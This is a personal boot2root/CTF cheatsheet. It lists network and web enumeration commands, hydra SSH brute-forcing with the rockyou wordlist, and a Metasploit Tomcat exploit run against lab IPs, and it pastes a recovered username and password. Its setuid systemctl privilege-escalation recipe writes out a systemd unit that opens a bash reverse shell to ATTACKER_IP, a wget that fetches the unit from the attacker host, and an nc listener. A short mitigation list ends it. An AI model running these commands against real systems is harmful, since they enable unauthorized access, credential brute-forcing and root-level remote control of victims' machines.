# Boot2Root Cheatsheet


## **Enumeration**
### **Network Scanning**
```bash
nmap -sn [Subnet]     nmap -sn 192.168.80.0/24          # Ping sweep for live hosts

nmap -sC -sV -oN nmap_initial.txt [Target IP]  # Basic scan

nmap -A -p- -oN nmap_full.txt [Target IP]     # Aggressive scan

```

### **Web Enumeration**
```bash
gobuster dir -e -u http://10.10.181.27 -w /home/iftx/Desktop/Room/wordlist/common.txt -x .php,.txt,.js,.html

subfinder -d [Target Domain]     # Find subdomains

amass enum -d [Target Domain]    # Active enumeration
```

### **Service Enumeration**
```bash
hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh

```

## Metasploit

<details>
  <summary>
   Metasploit Exploitation (Ghostcat - CVE-2020-1938)

  </summary>

1. Launch Metasploit

 `msfconsole`

2. Search for AJP Exploits

   `msf6 > search ajp`
   
```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_jsp_upload_bypass  2020-02-24       excellent  Yes    Tomcat RCE via JSP Upload Bypass
```
3. Select and Configure the Exploit

   `msf6 > use 0 `
   

`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > show options`


```
Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s)
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host
```


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 10.10.228.82`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT 8009`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run`


skyfuck:8730281lkjlkjdqlksalks


  
</details>

## Privilege Escalation

<details>
  <summary>
  Privilege Escalation via Misconfigured setuid Binary (systemctl)
    
  </summary>



## Exploit Steps

1. Find setuid binaries owned by root:

```bash
find / -user root -perm -4000 -print 2>/dev/null

```
If /bin/systemctl has setuid, it can be abused.

2. Create a malicious service (root.service):

```
ini
Copy
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

[Install]
WantedBy=multi-user.target

```

3. Host the service & transfer to target:
Start HTTP server:

```python -m http.server 80```
On target, download:


```wget http://ATTACKER_IP/root.service -O /tmp/root.service```

4. Enable & start the service:
```
systemctl enable /tmp/root.service  # Uses setuid to gain root
systemctl start root

```

5. Get root shell:
Attacker listens:

```
nc -lvnp PORT
```
Service executes reverse shell as root.

### Mitigation
Remove setuid from systemctl:


chmod u-s /bin/systemctl
Restrict service file creation in /tmp (use noexec)

Monitor for unusual service activations

</details>


